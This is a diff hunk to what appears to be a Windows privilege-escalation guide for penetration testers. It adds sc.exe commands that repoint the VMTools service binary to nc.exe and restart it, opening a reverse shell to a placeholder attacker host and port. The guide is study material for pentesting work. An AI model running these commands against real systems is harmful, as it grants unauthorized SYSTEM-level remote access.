@@ -326,6 +326,10 @@ Run a matched, source-available kernel exploit (verify the CVE against the missi
 
 ```powershell
 whoami /priv                          # confirm SeImpersonatePrivilege: Enabled
+
+sc.exe config VMTools binPath="C:\Users\\{{USERNAME}}\desktop\nc.exe -e cmd.exe {{LHOST}} {{LPORT}}"
+sc.exe stop VMTools
+sc.exe start VMTools
 ```
 
 **Which Potato for which Windows build** — the variant matters because Microsoft killed the older
